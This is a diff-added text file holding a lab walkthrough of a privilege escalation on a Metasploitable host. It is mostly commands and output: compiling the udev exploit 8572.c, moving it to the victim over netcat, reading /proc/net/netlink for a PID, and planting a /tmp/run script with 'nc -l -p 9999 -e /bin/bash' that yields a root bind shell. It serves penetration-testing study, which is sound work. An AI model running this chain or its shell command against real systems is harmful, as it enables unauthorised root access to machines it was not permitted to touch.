@@ -1,0 +1,69 @@
+Launch the exploit via Armitage to infect host 10.10.15.4 (metasploitable)
+This operation will prompt a shell; in this shell type the following to show which permissions we have
+
+$ whoami
+daemon
+$id
+uid=1(daemon) gid=1(daemon) groups=1(daemon)
+
+We are not logged as root, so we need to practice a Privilege Escalation
+Let's show the version of the kernel of the victim
+
+$ uname -a 
+Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
+
+In kali (attacker) search for an exploit for this version of kernel
+
+$ searchsploit kernel 2.6 Escalation
+Linux Kernel 2.6 (Gentoo / Ubuntu 8.10/9.04) UDEV < 1.4.1 - Local | exploits/linux/local/8572.c
+
+We found this exploit, let's compile it
+
+$ gcc /usr/share/exploitdb/exploits/linux/local/8572.c -o escalate
+
+Let's send the exploit to the victim on port 45454 (random port)
+
+$ sudo mkdir /usr/share/exploitdb/exploits/linux/local/send
+$ cd /usr/share/exploitdb/exploits/linux/local
+$ sudo cp escalate send/
+$ tar -cz . | nc -q 10 -l -p 45454  
+
+On the victim's console launch the command to receive the file from 10.10.15.3 (kali)
+
+$ nc -w 10 10.10.15.3 45454
+
+Now the victim holds the exploit
+
+$ ls
+escalate
+
+Set the file "executable"
+
+$ chmod +x escalate
+
+Now we need to find the PID of the process (netlink) that we will use to inject the payload
+
+$ cat /proc/net/netlink
+sk		 Eth 	Pid	Groups		Rmem	Wmem	Dump		Locks
+f7c4c800	 0	0	00000000	0	0	00000000	2
+f7c46c00	 4	0	00000000	0	0	00000000	2
+f7c49c00	 7	0	00000000	0	0	00000000	2
+f7c4cc00	 15	0	00000000	0	0	00000000	2
+f7c9c400	 15	2363	00000001	0	0	00000000	2
+f7c79800	 16	0	00000000	0	0	00000000	2
+
+We found the PID 2363, now we need to create a file that the exploit will run as root
+We will use Netcat to create a shell on port 9999
+
+$ echo '#!/bin/bash' > /tmp/run
+$ echo 'nc -l -p 9999 -e /bin/bash' >> /tmp/run
+
+Run the exploit
+
+$ ./escalate 2363
+
+Open a terminal on the attacker machine and type the following to connect to a root shell
+
+$ nc 10.10.15.4 9999
+$ id
+uid=0(root) gid=0(root)
